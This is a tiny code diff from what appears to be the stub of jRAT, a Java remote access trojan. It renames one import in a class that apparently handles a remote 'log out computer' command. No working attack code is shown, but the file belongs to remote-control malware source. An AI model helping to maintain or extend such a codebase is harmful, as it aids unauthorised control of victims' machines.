@@ -1,6 +1,6 @@
 package pro.jrat.stub.packets.incoming;
 
-import com.redpois0n.common.OperatingSystem;
+import pro.jrat.common.OperatingSystem;
 
 public class Packet30LogoutComputer extends AbstractIncomingPacket {
 
